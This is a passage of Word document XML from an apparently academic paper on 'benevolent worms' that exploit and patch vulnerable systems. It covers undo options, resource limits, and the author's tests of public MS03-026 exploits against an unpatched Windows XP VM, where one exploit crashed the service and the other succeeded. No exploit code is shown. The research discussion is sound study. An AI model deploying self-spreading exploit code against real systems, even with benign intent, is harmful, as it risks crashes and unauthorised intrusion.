    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="0061234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Allowing an administrator on the system to undo all changes made by the worm is important.  This gives more control back to the person responsible for the system in the event that the worm caused </w:t>
      </w:r>
      <w:r w:rsidR="00FC5AC5" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>unforeseen</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> issues.</w:t>
      </w:r>
      <w:r w:rsidR="00FC5AC5">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">  It also provides the administrator or user a feeling of </w:t>
      </w:r>
      <w:r w:rsidR="00FC5AC5">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">more control on their network and systems.  </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>A simple double-click on an icon on the desktop</w:t>
      </w:r>
      <w:r w:rsidR="00FC5AC5">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> would be one way to make this simple for the user</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="008D2CB2"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Another possible option would be the implementation of another version of the benevolent worm that can undo what the previous</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> worm</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> did (gaining initial access in some other method</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> or possibly the same way still</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.  This would be especially useful if the first version of the worm didn't fully and correctly patch the system as it would allow an automated fix to be distributed.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00400D80">
      <w:pPr>
        <w:pStyle w:val="TH2"/>
      </w:pPr>
      <w:bookmarkStart w:id="26" w:name="_Toc321736798"/>
      <w:r w:rsidRPr="00861880">
        <w:t>Other Considerations</w:t>
      </w:r>
      <w:bookmarkEnd w:id="26"/>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="008D2CB2"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worm should not consume excess</w:t>
      </w:r>
      <w:r w:rsidR="00686CE7">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ive</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> CPU on the infected system.  This can be accomplished by having the worm process lower its CPU priority to a lower or even the lowest setting.  This does incur the risk of the system being so busy that the worm doesn’t execute in a timely manner, but the trade-off of reducing harmful interference of usability by the system is justified.</w:t>
      </w:r>
      <w:r w:rsidR="004E6165">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">  Memory usage must also be taken into account such that if the system becomes low on resources the worm should consider immediate termination to free them.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00400D80">
      <w:pPr>
        <w:pStyle w:val="TH2"/>
      </w:pPr>
      <w:bookmarkStart w:id="27" w:name="_Toc321736799"/>
      <w:r w:rsidRPr="00861880">
        <w:t>Exploits</w:t>
      </w:r>
      <w:bookmarkEnd w:id="27"/>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00FB7BF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highest risk a benevolent worm poses is during the phase where it is trying to exploit a vulnerability on a target.  The goal is to execute the benevolent worm’s code on the target system so it can patch it.  This could happen before a malicious worm has exploited it or even afterwards (in an effort to clean the system of the malicious program).  When executing the exploit three things could happen:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00B35F43"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B35F43">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>The exploit does nothing (the system was patched, firewalled, or not vulnerable)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00B35F43"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B35F43">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">The exploit successfully executes on the target and the benevolent worm code </w:t>
      </w:r>
      <w:r w:rsidR="00A8797A">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>executes</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00B35F43"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B35F43">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>The exploit causes the target to crash</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In the first case the benevolent worm simply logs that it didn’t get access and moves on.  The third case is typically caused because most exploits must trigger a memory buffer overflow of some type in order to get the target to execute the exploit’s payload code.  If the memory doesn’t align correctly then the target service or machine could crash instead of executing the desired code.  In fact even in the second case a service on the target that was exploited could still crash yet execute the worm’s code.  Many systems are setup to simply restart the service in the event that the process crashes.</w:t>
      </w:r>
      <w:r w:rsidR="00B811A0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">  In some cases the service can be so critical that the OS must automatically restart the system.  </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>However, one possibility is that the service or target simply locks up and stops responding.  The OS may not detect</w:t>
      </w:r>
      <w:r w:rsidR="004355FF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the crash</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> or be unable to restart the service.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00E1090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During testing I investigated vulnerability MS03-026 (Microsoft </w:t>
      </w:r>
      <w:r w:rsidR="00493963">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2003</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>) as a potential exploit for my test benevolent worm code.  Using an exploit from exploit-db.com (ey4s</w:t>
      </w:r>
      <w:r w:rsidR="0058783B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2003</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">) I compiled the code (using </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>MinGW</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">) and executed it against a Windows XP Professional 32-bit </w:t>
      </w:r>
      <w:r w:rsidR="0058783B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">VM </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>without any service packs (or other patches) with the result</w:t>
      </w:r>
      <w:r w:rsidR="00F1274E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> shown in figures 1 and 2</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AA2C9E" w:rsidRPr="00AA2C9E" w:rsidRDefault="00AA2C9E" w:rsidP="00AA2C9E">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:keepNext/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="28" w:name="_Toc321730225"/>
      <w:r w:rsidRPr="00AA2C9E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="009349AB" w:rsidRPr="00AA2C9E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="00AA2C9E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="009349AB" w:rsidRPr="00AA2C9E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00FB7FF2">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="009349AB" w:rsidRPr="00AA2C9E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="00AA2C9E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>:  Exploit crashing service</w:t>
      </w:r>
      <w:bookmarkEnd w:id="28"/>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00B41FF9" w:rsidP="00B63226">
      <w:pPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5438775" cy="4581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38775" cy="4581525"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln w="9525">
                      <a:noFill/>
                      <a:miter lim="800000"/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00460373" w:rsidRPr="00460373" w:rsidRDefault="00460373" w:rsidP="00460373">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:keepNext/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="29" w:name="_Toc321730226"/>
      <w:r w:rsidRPr="00460373">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="009349AB" w:rsidRPr="00460373">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="00460373">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="009349AB" w:rsidRPr="00460373">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00FB7FF2">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidR="009349AB" w:rsidRPr="00460373">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="00460373">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: System rebooting after crash by exploit</w:t>
      </w:r>
      <w:bookmarkEnd w:id="29"/>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00B41FF9" w:rsidP="00B63226">
      <w:pPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5505450" cy="4638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05450" cy="4638675"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln w="9525">
                      <a:noFill/>
                      <a:miter lim="800000"/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="0003009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result being that the service crashed, and the system rebooted in order to recover.  This did not </w:t>
      </w:r>
      <w:r w:rsidR="009A1A50">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>allow the execution of the payload</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> on the target system and underlined the issue of the risk of attempting to exploit remote systems.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="001D6396"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Using another exploit code (Moore 2009) to exploit this vulnerability (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>SecurityFocus</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00DE2D40">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2009</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">) however was successful as shown </w:t>
      </w:r>
      <w:r w:rsidR="00F1274E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>in figure 3</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FB7FF2" w:rsidRPr="00FB7FF2" w:rsidRDefault="00FB7FF2" w:rsidP="00FB7FF2">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:keepNext/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="30" w:name="_Toc321730227"/>
      <w:r w:rsidRPr="00FB7FF2">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="009349AB" w:rsidRPr="00FB7FF2">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="00FB7FF2">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="009349AB" w:rsidRPr="00FB7FF2">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidRPr="00FB7FF2">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidR="009349AB" w:rsidRPr="00FB7FF2">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="00FB7FF2">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: Successful exploit without crash</w:t>
      </w:r>
      <w:bookmarkEnd w:id="30"/>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00B41FF9" w:rsidP="00B63226">
      <w:pPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="6429375" cy="403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9375" cy="4038600"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln w="9525">
                      <a:noFill/>
                      <a:miter lim="800000"/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
